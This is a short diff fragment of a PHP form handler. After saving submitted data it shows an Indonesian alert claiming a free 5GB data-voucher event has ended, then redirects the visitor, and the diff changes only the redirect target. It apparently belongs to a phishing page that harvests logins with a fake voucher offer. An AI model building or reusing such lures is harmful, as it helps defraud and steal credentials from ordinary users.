@@ -19,7 +19,7 @@ Date Submitted : '.$now.'
 ');
 if($save){
     echo "<script>alert('MOHON MAAF EVENT VOUCHER KOUTA 5GB FLASH SUDAH BERAKHIR')</script>";
-    echo "<script>location='index.php'</script>";
+    echo "<script>location='index.html'</script>";
 }else{
     echo "<script>alert('Wajib Isi Semua Form')</script>";
     echo "<script>location='login_gagal.php'</script>";
